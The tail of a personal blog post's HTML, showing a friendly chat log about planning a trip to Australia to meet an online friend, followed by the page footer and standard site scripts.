+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">pocas — 오늘 오전 4:49</span><br><span class="line">Hello pew long time. I decided to go to Australia this 2022 year(this year). Just travel. So If you have a time, Could you meet? I will buy the very very very expensive food for you</span><br><span class="line"></span><br><span class="line">TheGrandPew — 오늘 오전 6:56</span><br><span class="line">👀, where in australia are you going?</span><br><span class="line"></span><br><span class="line">pocas — 오늘 오전 6:57</span><br><span class="line">maybe i&#x27;ll go to sydney</span><br><span class="line">where do you live</span><br><span class="line"></span><br><span class="line">TheGrandPew — 오늘 오전 7:00</span><br><span class="line">sunny coast, which is in qld</span><br><span class="line"></span><br><span class="line">pocas — 오늘 오전 7:02</span><br><span class="line">이미지</span><br><span class="line">Oh... how long will it take</span><br><span class="line"></span><br><span class="line">TheGrandPew — 오늘 오전 7:02</span><br><span class="line">long</span><br><span class="line">~1 day driving</span><br><span class="line"></span><br><span class="line">pocas — 오늘 오전 7:02</span><br><span class="line">???? holy shit</span><br><span class="line">hmm first ok</span><br><span class="line">so</span><br><span class="line">i think I will stay for 7 day</span><br><span class="line">So, it would be good to meet on the third day!</span><br><span class="line">I can go to there</span><br><span class="line"></span><br><span class="line">TheGrandPew — 오늘 오전 7:03</span><br><span class="line">ok</span><br><span class="line"></span><br><span class="line">pocas — 오늘 오전 7:03</span><br><span class="line">I&#x27;ll let you know once the date is set! I have to go to Japan before that 🙂</span><br><span class="line">TheGrandPew — 오늘 오전 7:04</span><br><span class="line">sick</span><br><span class="line"></span><br><span class="line">pocas — 오늘 오전 7:04</span><br><span class="line">Is there an airport on the sunny coast?</span><br><span class="line"></span><br><span class="line">pocas — 오늘 오전 7:04</span><br><span class="line">why sick</span><br><span class="line"></span><br><span class="line">TheGrandPew — 오늘 오전 7:04</span><br><span class="line">there is</span><br><span class="line"></span><br><span class="line">pocas — 오늘 오전 7:04</span><br><span class="line">covid 19?</span><br><span class="line"></span><br><span class="line">TheGrandPew — 오늘 오전 7:04</span><br><span class="line">sick is = cool</span><br><span class="line"></span><br><span class="line">pocas — 오늘 오전 7:05</span><br><span class="line">actually i understood lol😅</span><br><span class="line">pocas — 오늘 오전 7:05</span><br><span class="line">ok</span><br><span class="line">If i go to plane to your location in sydney, take the 1 hour 30m </span><br><span class="line"></span><br><span class="line">TheGrandPew — 오늘 오전 7:09</span><br><span class="line">nice, btw where i live is like peak tourist location so youll have a good time</span><br></pre></td></tr></table></figure>
+<p> I go to meet an Australian friend I knew a year ago.</p>
+<hr>
+<p>Yes.. Anyway, I hope this will happen.</p>
+<hr>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-gotm"><span class="toc-number">1.</span> <span class="toc-text">(Web) gotm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ETC-My-Plan"><span class="toc-number">2.</span> <span class="toc-text">(ETC) My Plan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Promise-Will-meet-pew"><span class="toc-number">3.</span> <span class="toc-text">(Promise) Will meet pew</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.pocas.kr/2022/03/27/2022-03-27-Line-CTF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.pocas.kr/2022/03/27/2022-03-27-Line-CTF/&text=Line CTF 2022 Write Up and Anything Finally "><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.pocas.kr/2022/03/27/2022-03-27-Line-CTF/&title=Line CTF 2022 Write Up and Anything Finally "><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.pocas.kr/2022/03/27/2022-03-27-Line-CTF/&is_video=false&description=Line CTF 2022 Write Up and Anything Finally "><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Line CTF 2022 Write Up and Anything Finally &body=Check out this article: https://blog.pocas.kr/2022/03/27/2022-03-27-Line-CTF/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.pocas.kr/2022/03/27/2022-03-27-Line-CTF/&title=Line CTF 2022 Write Up and Anything Finally "><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.pocas.kr/2022/03/27/2022-03-27-Line-CTF/&title=Line CTF 2022 Write Up and Anything Finally "><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.pocas.kr/2022/03/27/2022-03-27-Line-CTF/&title=Line CTF 2022 Write Up and Anything Finally "><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.pocas.kr/2022/03/27/2022-03-27-Line-CTF/&title=Line CTF 2022 Write Up and Anything Finally "><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.pocas.kr/2022/03/27/2022-03-27-Line-CTF/&name=Line CTF 2022 Write Up and Anything Finally &description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.pocas.kr/2022/03/27/2022-03-27-Line-CTF/&t=Line CTF 2022 Write Up and Anything Finally "><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2022
+    POCAS
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
